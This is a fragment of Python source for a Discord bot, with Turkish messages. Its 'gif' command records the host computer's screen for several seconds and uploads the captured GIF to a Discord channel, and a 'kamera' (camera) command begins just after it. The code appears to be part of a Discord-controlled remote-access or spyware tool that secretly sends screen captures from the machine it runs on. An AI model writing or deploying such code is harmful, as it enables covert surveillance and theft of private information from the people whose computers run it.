@client.command(name="gif")
async def screen_gif(ctx, sure: int = 3, fps: int = 4):
  try:
    if sure > 10:
      sure = 10
    frames = []
    total_frames = sure * fps
    interval = 1.0 / fps
    await ctx.send(f"🎬 {sure} saniyelik ekran GIF'i alınıyor...")
    for _ in range(total_frames):
      img = ImageGrab.grab().resize((640, 360))
      frames.append(img)
      await asyncio.sleep(interval)

    output = BytesIO()
    frames[0].save(
        output,
        format="GIF",
        save_all=True,
        append_images=frames[1:],
        duration=int(1000 / fps),
        loop=0,
    )
    output.seek(0)
    file = discord.File(fp=output, filename="screen.gif")
    await ctx.send(file=file)
  except Exception as e:
    await ctx.send(f"Hata: {e}")


@client.command(name="kamera")
